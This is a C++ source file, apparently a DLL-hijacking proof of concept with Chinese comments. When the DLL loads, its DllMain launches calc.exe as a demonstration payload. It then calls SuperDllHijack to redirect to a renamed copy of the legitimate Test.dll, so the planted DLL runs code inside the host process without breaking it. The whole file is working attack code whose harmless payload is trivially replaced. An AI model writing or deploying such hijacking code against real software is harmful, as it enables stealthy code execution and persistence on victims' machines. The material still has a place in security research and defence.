// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "dllhijack.h"

#include "shlwapi.h"
#pragma comment(lib, "shlwapi")

VOID DllHijack1(HMODULE hMod)
{
	TCHAR tszDllPath[MAX_PATH] = { 0 };

	GetModuleFileName(hMod, tszDllPath, MAX_PATH);
	PathRemoveFileSpec(tszDllPath);
	PathAppend(tszDllPath, TEXT(".Test.dll"));
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	CreateProcess(TEXT("C:\\Windows\\System32\\calc.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	SuperDllHijack(L"Test.dll", tszDllPath);
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DllHijack1(hModule);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}


